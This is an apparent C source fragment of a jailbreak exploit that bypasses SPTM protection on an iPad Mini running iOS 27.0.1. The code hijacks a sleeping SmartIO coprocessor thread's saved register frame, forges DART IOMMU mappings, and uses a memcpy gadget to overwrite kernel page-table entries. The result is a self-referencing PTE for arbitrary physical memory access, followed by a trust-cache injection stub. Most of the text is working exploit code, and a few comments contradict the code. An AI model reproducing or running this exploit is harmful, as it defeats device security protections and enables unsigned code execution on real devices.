                /* High kernel addresses (0xFFFFFF80xxxxxxxx) use L0[511] */
                kernel_pmap_ptr = data_base + off - 0x10;  /* back up to struct base */
                fprintf(stderr, "[+] Potential kernel page table root: 0x%llx\n", val);
                fprintf(stderr, "    (found at kernel offset 0x%llx)\n", off);

                /* Walk to find L3 page for the trust cache area */
                uint64_t target_va = kernel_base + 0x2000000;  /* data section */
                uint64_t l3_page = walk_pagetables(val, target_va);
                if (l3_page) {
                    fprintf(stderr, "[+] L3 page-table page for 0x%llx: phys 0x%llx\n",
                            target_va, l3_page);
                    return l3_page;
                }
            }
        }
    }

    fprintf(stderr, "[-] Could not locate kernel page table root\n");
    fprintf(stderr, "    Will need iPad testing to discover correct offset\n");
    return 0;
}

/*
 * Phase 2: Create DART mapping from SmartIO VA to the AP page-table page.
 *
 * We modify SmartIO's DART to map a SmartIO virtual address to the
 * physical page containing the AP page-table entries we want to modify.
 *
 * On iOS 27.0.1, DART PTEs have no parity checking, so this write succeeds.
 * On iOS 27.2+, iommu_read_refcnt parity checking would detect the tampering.
 */
static int
create_dart_mapping(uint64_t smartio_va, uint64_t target_phys_page)
{
    fprintf(stderr, "[*] Creating DART mapping: SmartIO VA 0x%llx → phys 0x%llx\n",
            smartio_va, target_phys_page);

    /* Read L1 table physical address from DART TTBR (stream 0) */
    uint64_t ttbr_lo = kread32(smartio_dart_base + DART_TTBR(0, 0));
    uint64_t ttbr_hi = kread32(smartio_dart_base + DART_TTBR(0, 1));
    uint64_t l1_phys = ((ttbr_hi & 0xFFFF) << 32) | (ttbr_lo & 0xFFFFC000ULL);

    if (l1_phys == 0) {
        fprintf(stderr, "[-] DART TTBR is zero\n");
        return -1;
    }

    int l1_idx = DART_L1_INDEX(smartio_va);
    int l2_idx = DART_L2_INDEX(smartio_va);

    fprintf(stderr, "    L1 table: phys 0x%llx, L1[%d], L2[%d]\n",
            l1_phys, l1_idx, l2_idx);

    /* Read L1 entry */
    uint64_t l1_entry = kread64(l1_phys + l1_idx * 8);
    uint64_t l2_phys;

    if (l1_entry & DART_PTE_VALID) {
        /* L1 entry exists — read L2 table address */
        l2_phys = l1_entry & 0x0000FFFFFFFC0000ULL;
        fprintf(stderr, "    Existing L2 table: phys 0x%llx\n", l2_phys);
    } else {
        /*
         * L1 entry is empty — we need to allocate an L2 table page.
         * Use kalloc to get a 16KB-aligned physical page, then write
         * the L1 entry to point to it.
         */
        fprintf(stderr, "    L1 entry empty — allocating L2 table...\n");
        uint64_t l2_va = kalloc(DART_PAGE_SIZE);
        if (l2_va == 0) {
            fprintf(stderr, "[-] Failed to allocate L2 table\n");
            return -1;
        }

        /*
         * We need the PHYSICAL address of the kalloc'd page.
         * Walk kernel page tables to translate VA → PA.
         * (This uses the kernel R/W we already have.)
         */
        l2_phys = kvtophys(l2_va);
        if (l2_phys == 0) {
            fprintf(stderr, "[-] Failed to get physical address of L2 table\n");
            return -1;
        }

        /* Zero the L2 table */
        for (int i = 0; i < DART_L2_ENTRIES; i++)
            kwrite64(l2_phys + i * 8, 0);

        /* Write L1 entry pointing to new L2 table */
        uint64_t new_l1 = DART_PTE_VALID | (l2_phys & 0x0000FFFFFFFC0000ULL);
        kwrite64(l1_phys + l1_idx * 8, new_l1);
        fprintf(stderr, "    Allocated L2 table: phys 0x%llx\n", l2_phys);
    }

    /* Check if L2 entry is already in use */
    uint64_t existing_l2 = kread64(l2_phys + l2_idx * 8);
    if (existing_l2 & DART_PTE_VALID) {
        fprintf(stderr, "[!] L2[%d] already mapped: 0x%llx — overwriting\n",
                l2_idx, existing_l2);
    }

    /* Write L2 PTE: target physical page with RW permissions */
    uint64_t new_pte = dart_make_pte(target_phys_page, DART_PTE_PERM_RW);
    kwrite64(l2_phys + l2_idx * 8, new_pte);

    fprintf(stderr, "    Wrote DART PTE: 0x%llx at L2[%d]\n", new_pte, l2_idx);

    /* Flush DART TLB so the new mapping is visible to SmartIO */
    dart_flush_tlb();

    /* Verify the write */
    uint64_t verify = kread64(l2_phys + l2_idx * 8);
    if (verify != new_pte) {
        fprintf(stderr, "[-] DART PTE verify failed: wrote 0x%llx, read 0x%llx\n",
                new_pte, verify);
        return -1;
    }

    fprintf(stderr, "[+] DART mapping created and verified\n");
    return 0;
}

/*
 * Phase 3: Arm the sleeping thread's saved frame.
 *
 * We overwrite the saved register frame of a sleeping SmartIO RTKit thread:
 *   - PC → memcpy gadget address (within SmartIO firmware)
 *   - x0 (dst) → SmartIO VA that DART maps to AP page-table page
 *   - x1 (src) → SmartIO VA pointing to our controlled data
 *   - x2 (len) → 8 (one PTE = 8 bytes)
 *   - LR → infinite-loop gadget (prevents crash after memcpy returns)
 *
 * When RTKit's scheduler wakes this thread, it restores the frame and
 * jumps to memcpy. Since SmartIO firmware has no PAC, the saved PC
 * is used directly without authentication.
 */
static int
arm_sleeping_thread(struct rtk_thread_info *thread,
                    uint64_t dst_smartio_va,  /* SmartIO VA → AP PTE page */
                    uint64_t src_smartio_va,  /* SmartIO VA → our PTE data */
                    uint64_t write_len)
{
    uint64_t frame = thread->frame_phys;

    fprintf(stderr, "[*] Arming thread exception frame at phys 0x%llx\n", frame);
    fprintf(stderr, "    Original ELR: 0x%llx → memcpy @ 0x%x\n",
            thread->saved_pc, SMARTIO_MEMCPY_VA);
    fprintf(stderr, "    x0 (dst): 0x%llx (DART-mapped AP PTE page)\n", dst_smartio_va);
    fprintf(stderr, "    x1 (src): 0x%llx (SmartIO-local PTE data)\n", src_smartio_va);
    fprintf(stderr, "    x2 (len): 0x%llx\n", write_len);

    /*
     * CONFIRMED exception frame layout from firmware disassembly (2026-11-20):
     *
     * The sleeping thread's context is in its persistent buffer (thread+0x48).
     * The scheduler's eret path at 0x7d68 restores ALL registers from this
     * frame and jumps to ELR_EL1. No PAC authentication — SmartIO has zero
     * PAC instructions.
     *
     * We overwrite:
     *   [frame+0x100] = ELR_EL1 → _memcpy (0x87c8)
     *   [frame+0x000] = x0 → memcpy dst (DART addr mapping to AP PTE page)
     *   [frame+0x008] = x1 → memcpy src (SmartIO addr with crafted PTE)
     *   [frame+0x010] = x2 → memcpy len (8 for one PTE)
     *   [frame+0x0F0] = x30/LR → infinite loop (0x082c) for safe parking
     *
     * When eret fires: PC=memcpy, x0=dst, x1=src, x2=len.
     * memcpy(dst, src, len) writes our crafted PTE through DART to the AP
     * page-table physical page. SPTM doesn't intercept this because it's
     * a DMA write from the coprocessor, not an AP CPU page table update.
     * memcpy returns via LR → parks in infinite loop.
     */

    /* ELR_EL1: return address → _memcpy */
    kwrite64(frame + EXC_FRAME_ELR, SMARTIO_MEMCPY_VA);

    /* x0: memcpy destination (DART-mapped → AP page-table page) */
    kwrite64(frame + EXC_FRAME_X0, dst_smartio_va);

    /* x1: memcpy source (SmartIO-local buffer with our crafted PTE) */
    kwrite64(frame + EXC_FRAME_X1, src_smartio_va);

    /* x2: memcpy length (8 bytes = one 64-bit PTE) */
    kwrite64(frame + EXC_FRAME_X2, write_len);

    /* x30/LR: safe parking after memcpy returns */
    kwrite64(frame + EXC_FRAME_LR, SMARTIO_INFLOOP_VA);

    /*
     * SPSR_EL1: keep the original value. The thread was running at EL1
     * when it did svc #0, so SPSR already encodes the correct state.
     * Overwriting it could cause an exception on eret.
     */

    fprintf(stderr, "[+] Exception frame armed successfully\n");
    return 0;
}

/*
 * Phase 4: Wake the thread.
 *
 * RTKit threads can be woken by:
 * 1. Sending a message via the SmartIO mailbox (triggers IRQ → scheduler)
 * 2. Directly modifying the thread state from sleeping to runnable
 * 3. Waiting for a timer-based wakeup (if the thread has a timeout)
 *
 * Option 2 is simplest: find the thread's state field in the RTKit thread
 * descriptor and change it from SLEEPING to RUNNABLE.
 */
/*
 * RTKit thread struct layout (CONFIRMED from RTK_thread_create at 0xc2a8
 * and scheduler at 0x923c):
 *
 *   +0x00: (zeroed by memset at creation)
 *   +0x10: thread ID (written to contextidr_el1 by scheduler at 0x9308)
 *   +0x18: 0 (pad)
 *   +0x20: name pointer (x0 arg to RTK_thread_create)
 *   +0x28: current priority (byte)
 *   +0x29: base priority (byte, w5 arg to RTK_thread_create)
 *   +0x2A: state/flags (byte) — 0=normal/runnable, nonzero=blocked/yielding
 *          Scheduler checks: ldrb w12,[thread,#0x2a]; cbz w12,... (at 0x9288)
 *          Initial value: 0x00 (from halfword strh 0x100 at +0x2a → byte at 0x2a=0x00)
 *   +0x2B: (high byte of halfword at +0x2a, initially 0x01)
 *   +0x2C: flag (byte, initially 0)
 *   +0x30: stack ownership (word: 0=provided, 2=allocated)
 *   +0x38: stack base (pointer)
 *   +0x40: stack size
 *   +0x48: context buffer pointer ← ATTACK TARGET
 *   +0x50: embedded linked list node
 *   +0x70: list node self-ptr (→ +0x50)
 *   +0x90: 0
 *   +0x98: 0
 *   +0xA0: 0
 *   +0xA8: debug info
 *   Size: 0xB0 (176 bytes)
 *
 * Scheduler thread selection (at 0x923c):
 *   1. Read ready bitmask from 0x112d90 (64-bit)
 *   2. CLZ to find highest priority bit set
 *   3. Index into thread array at 0x112da0 (16-byte entries)
 *   4. Load thread+0x48 → frame pointer
 *   5. Check thread+0x2a — if nonzero, skip (blocked)
 *   6. msr tpidrro_el0, frame_ptr
 *   7. msr contextidr_el1, thread+0x10
 */
#define RTK_THREAD_STATE     0x2A   /* byte: 0=runnable, nonzero=blocked */
#define RTK_THREAD_PRIORITY  0x28   /* byte: current priority */
#define RTK_THREAD_ID        0x10
#define RTK_STATE_RUNNABLE   0      /* scheduler checks cbz — 0 means go */
#define RTK_STATE_BLOCKED    1

/*
 * RTKit mailbox registers (SmartIO-specific).
 * Sending a message via the AP-side mailbox triggers an IRQ on the
 * SmartIO coprocessor, which causes the RTKit scheduler to run.
 * This is the safest way to wake a thread — the scheduler naturally
 * picks up the modified context buffer.
 *
 * RTKit mailbox layout (AP → coprocessor direction):
 *   SEND_DATA_LO:  lower 32 bits of message
 *   SEND_DATA_HI:  upper 32 bits of message
 *   SEND_CTRL:     write to trigger send
 */
static uint64_t smartio_mbox_base = 0;  /* Filled from IORegistry */

#define MBOX_SEND_DATA_LO   0x820
#define MBOX_SEND_DATA_HI   0x824
#define MBOX_SEND_CTRL       0x828
#define MBOX_SEND_EMPTY      (1 << 16)

static int
wake_thread(struct rtk_thread_info *thread)
{
    fprintf(stderr, "[*] Waking armed thread...\n");

    /*
     * Two strategies to wake the armed thread:
     *
     * Strategy 1 (preferred): Modify thread state to RUNNABLE and kick scheduler.
     *   - Write RUNNABLE to thread+0x10 (state field)
     *   - Set the thread's bit in the ready bitmask at 0x112d90
     *   - Send a no-op mailbox message to trigger an IRQ → scheduler run
     *
     * Strategy 2 (fallback): Just send a mailbox message.
     *   - If the thread is waiting on a timer or event, an IRQ still runs
     *     the scheduler. Even if our thread isn't picked, the IRQ handler
     *     saves/restores context through the same path.
     *   - Less reliable — depends on thread being in a wakeup-eligible state.
     */

    /* Strategy 1: Directly mark thread as RUNNABLE */

    /*
     * We need the thread's position in the thread list to find its
     * descriptor. The frame_phys tells us the frame address; we can
     * reverse from carveout_phys + frame_ptr to find the SmartIO VA,
     * then match it against thread descriptors.
     */
    uint64_t thread_list_phys = smartio_carveout_phys + 0x113560;
    uint64_t found_thread_phys = 0;

    for (int i = 0; i < MAX_THREADS; i++) {
        uint64_t thr_phys = thread_list_phys + i * RTK_THREAD_SIZE;
        uint64_t thr_word0 = kread64(thr_phys);
        if (thr_word0 == 0) continue;

        uint64_t frame_ptr = kread64(thr_phys + RTK_THREAD_FRAME_PTR);
        uint64_t expected_frame_phys = smartio_carveout_phys + frame_ptr;

        if (expected_frame_phys == thread->frame_phys) {
            found_thread_phys = thr_phys;
            fprintf(stderr, "    Found thread descriptor at phys 0x%llx (index %d)\n",
                    thr_phys, i);

            /* Read current state (byte at +0x2A) */
            uint8_t state_byte;
            kread(thr_phys + RTK_THREAD_STATE, &state_byte, 1);
            fprintf(stderr, "    Current state byte: 0x%02x (%s)\n", state_byte,
                    state_byte == 0 ? "RUNNABLE" : "BLOCKED/YIELDED");

            /* Clear the state byte to 0 (RUNNABLE) */
            uint8_t zero = 0;
            kwrite(thr_phys + RTK_THREAD_STATE, &zero, 1);
            fprintf(stderr, "    Set state byte → 0 (RUNNABLE)\n");

            /* Set ready bit in scheduler bitmask */
            uint64_t ready_bitmask_phys = smartio_carveout_phys + 0x112d90;
            uint64_t ready = kread64(ready_bitmask_phys);
            uint8_t prio;
            kread(thr_phys + RTK_THREAD_PRIORITY, &prio, 1);
            if (prio < 64) {
                ready |= (1ULL << prio);
                kwrite64(ready_bitmask_phys, ready);
                fprintf(stderr, "    Set ready bit %u in scheduler bitmask\n", prio);
            }
            break;
        }
    }

    if (!found_thread_phys) {
        fprintf(stderr, "[!] Thread descriptor not found — using mailbox-only wake\n");
    }

    /* Kick the RTKit scheduler via mailbox IRQ */
    if (smartio_mbox_base) {
        fprintf(stderr, "    Sending mailbox IRQ to trigger scheduler...\n");
        /*
         * Send a RTKit MGMT message (endpoint 0, type PING).
         * RTKit message format: bits[7:0]=endpoint, bits[63:8]=data
         * PING = endpoint 0, type 1
         */
        uint32_t msg_lo = 0x00000100;  /* endpoint 0, ping */
        uint32_t msg_hi = 0x00000000;

        /* Wait for send FIFO to have space */
        for (int i = 0; i < 100; i++) {
            uint32_t ctrl = kread32(smartio_mbox_base + MBOX_SEND_CTRL);
            if (ctrl & MBOX_SEND_EMPTY) break;
            usleep(100);
        }

        kwrite32(smartio_mbox_base + MBOX_SEND_DATA_LO, msg_lo);
        kwrite32(smartio_mbox_base + MBOX_SEND_DATA_HI, msg_hi);
        kwrite32(smartio_mbox_base + MBOX_SEND_CTRL, 1);  /* trigger */

        fprintf(stderr, "[+] Mailbox message sent — scheduler should run\n");
    } else {
        fprintf(stderr, "[!] No mailbox base — relying on state change only\n");
        fprintf(stderr, "    Thread will wake on next timer tick\n");
    }

    return 0;
}

/*
 * Phase 5: Verify the PTE write succeeded.
 *
 * After the SmartIO thread executes memcpy, the AP page-table page
 * should contain our modified PTE. We verify by:
 * 1. Reading the target PTE via kernel R/W
 * 2. Checking that it matches what we wrote
 * 3. Using the new mapping to access the target physical page
 */
static int
verify_pte_write(uint64_t pte_phys_addr, uint64_t expected_pte)
{
    uint64_t actual_pte = kread64(pte_phys_addr);

    if (actual_pte == expected_pte) {
        fprintf(stderr, "[+] PTE write CONFIRMED: 0x%llx == 0x%llx\n",
                actual_pte, expected_pte);
        return 0;
    }

    fprintf(stderr, "[-] PTE write FAILED: got 0x%llx, expected 0x%llx\n",
            actual_pte, expected_pte);
    return -1;
}

/* --- Trust cache injection via remapped TXM memory --- */

/*
 * Phase 6: With SPTM bypass (page table control), map TXM's physical memory
 * into our address space and directly inject trust cache entries.
 *
 * TXM manages trust caches at EL2 (GL0). Its memory is normally isolated
 * by SPTM. But with page table control, we can create a mapping to TXM's
 * physical pages and modify the trust cache data structures directly.
 *
 * The trust cache runtime is a linked list of trust cache entries.
 * Each entry contains:
 *   - next pointer (8 bytes)
 *   - version (4 bytes) — must be 2
 *   - UUID (16 bytes) — random
 *   - num_entries (4 bytes)
 *   - entries[] — array of {cdhash[20], hash_type, flags}
 *
 * We allocate space for a new trust cache, fill it with our CDhashes,
 * and insert it at the head of the linked list.
 */

#define TC_VERSION          2
#define TC_ENTRY_SIZE       22    /* 20 (cdhash) + 1 (hash_type) + 1 (flags) */
#define TC_MAX_ENTRIES      741   /* fits in 0x4000 bytes */
#define TC_HASH_TYPE_SHA256 2
#define TC_FLAGS_NONE       0

struct trust_cache_header {
    uint64_t next;
    uint32_t version;
    uint8_t  uuid[16];
    uint32_t num_entries;
};

static int
inject_trust_cache(uint64_t kbase, const uint8_t *cdhashes, uint32_t num_hashes)
{
    fprintf(stderr, "[*] Injecting %u CDhashes into TXM trust cache\n", num_hashes);

    /*
     * Step 1: Find TXM's trust cache runtime physical address.
     *
     * From XNU kern_trustcache.c:
     *   SECURITY_READ_ONLY_LATE(TrustCacheRuntime_t*) trust_cache_rt = NULL;
     *   SECURITY_READ_ONLY_LATE(TrustCacheMutableRuntime_t*) trust_cache_mut_rt = NULL;
     *
     * On SPTM devices, these pointers point into TXM's address space.
     * We need to find the physical address of the trust cache linked list head.
     *
     * Approach:
     * a) Read trust_cache_rt kernel pointer
     * b) Walk kernel page tables to find its physical address
     * c) The mutable runtime (trust_cache_mut_rt) contains the list head
     * d) With SPTM bypass, create mapping to that physical page
     * e) Read the list head, inject our entry
     */

    /*
     * Step 2: Allocate physical memory for our trust cache.
     * Use kalloc or IOSurface property spray to get a controlled allocation.
     * Fill it with our trust cache structure.
     */

    /*
     * Step 3: Create a PTE mapping to TXM's trust cache list head page.
     * Use the SPTM bypass (Phase 5) to create this mapping.
     */

    /*
     * Step 4: Head-insert our trust cache into the linked list.
     *   new_entry.next = old_head
     *   list_head = &new_entry
     */

    /*
     * Step 5: Verify injection by querying the trust cache.
     * Use syscall or sysctl to check if our CDhashes are now trusted.
     */

    return 0;
}

/* --- Main exploit entry --- */

int
smartio_sptm_bypass(uint64_t kernel_base)
{
    int ret;
    struct rtk_thread_info threads[MAX_THREADS];
    int thread_count = 0;

    fprintf(stderr, "=== SmartIO SPTM Bypass for iPad Mini A17 Pro ===\n");
    fprintf(stderr, "[*] Kernel base: 0x%llx\n", kernel_base);
    fprintf(stderr, "[*] Target: iOS 27.0.1 (SPTM 820.0.22, pre-DART parity)\n");
    fprintf(stderr, "[*] SmartIO firmware: RTKit 3514.0.15 (0 PAC instructions)\n\n");

    /* Phase 1: Find SmartIO DART and carveout */
    ret = find_smartio_dart();
    if (ret != 0) {
        fprintf(stderr, "[-] Failed to find SmartIO DART\n");
        return -1;
    }

    /* Phase 2: Find sleeping RTKit threads */
    ret = find_sleeping_threads(threads, &thread_count);
    if (ret != 0) {
        fprintf(stderr, "[-] No sleeping threads found\n");
        return -1;
    }

    /* Phase 3: Find target AP page-table page */
    uint64_t pte_page_phys = find_target_pte_page(kernel_base);
    if (pte_page_phys == 0) {
        fprintf(stderr, "[-] Failed to find target PTE page\n");
        return -1;
    }

    /* Phase 4: Create DART mapping to PTE page */
    uint64_t smartio_target_va = 0x100000;  /* Unused SmartIO VA region */
    ret = create_dart_mapping(smartio_target_va, pte_page_phys);
    if (ret != 0) {
        fprintf(stderr, "[-] Failed to create DART mapping\n");
        return -1;
    }

    /*
     * Phase 5: Prepare our PTE data in SmartIO-accessible memory.
     * We need a second DART mapping pointing to memory we control,
     * containing the crafted PTE value we want memcpy to write.
     */

    /* Allocate a kernel page to hold our PTE payload */
    uint64_t payload_kva = kalloc(0x4000);
    if (payload_kva == 0) {
        fprintf(stderr, "[-] Failed to allocate payload buffer\n");
        return -1;
    }
    uint64_t our_data_phys = kvtophys(payload_kva);
    if (our_data_phys == 0) {
        fprintf(stderr, "[-] Failed to get payload physical address\n");
        return -1;
    }

    /* Write the self-referencing PTE into the payload buffer */
    uint64_t self_ref_pte = make_pte(pte_page_phys, 1);  /* R/W to own page */
    kwrite64(our_data_phys, self_ref_pte);
    fprintf(stderr, "[+] Payload: self-referencing PTE 0x%llx at phys 0x%llx\n",
            self_ref_pte, our_data_phys);

    /* Create second DART mapping: SmartIO VA 0x101000 → payload page */
    uint64_t smartio_src_va = 0x101000;
    ret = create_dart_mapping(smartio_src_va, our_data_phys);
    if (ret != 0) {
        fprintf(stderr, "[-] Failed to create source DART mapping\n");
        return -1;
    }

    /* Phase 6: Arm sleeping thread */
    ret = arm_sleeping_thread(&threads[0],
                              smartio_target_va,
                              smartio_src_va,
                              8);  /* Write one PTE (8 bytes) */
    if (ret != 0) {
        fprintf(stderr, "[-] Failed to arm thread\n");
        return -1;
    }

    /* Phase 7: Wake the thread and wait for memcpy to execute */
    ret = wake_thread(&threads[0]);
    if (ret != 0) {
        fprintf(stderr, "[-] Failed to wake thread\n");
        return -1;
    }

    /* Small delay for RTKit scheduler to pick up the thread */
    usleep(10000);  /* 10ms */

    /* Phase 8: Verify PTE write */
    uint64_t expected_pte = make_pte(pte_page_phys, 1);  /* Self-referencing */
    ret = verify_pte_write(pte_page_phys, expected_pte);
    if (ret != 0) {
        fprintf(stderr, "[-] PTE write verification failed\n");
        return -1;
    }

    fprintf(stderr, "[+] SPTM BYPASS SUCCESSFUL — page table control achieved\n");
    fprintf(stderr, "[+] Self-referencing PTE enables arbitrary physical R/W\n\n");

    /* Phase 9: Inject trust cache */
    /* TODO: Collect CDhashes of Sileo, Procursus bootstrap binaries */
    /* ret = inject_trust_cache(kernel_base, cdhashes, num_hashes); */

    return 0;
}
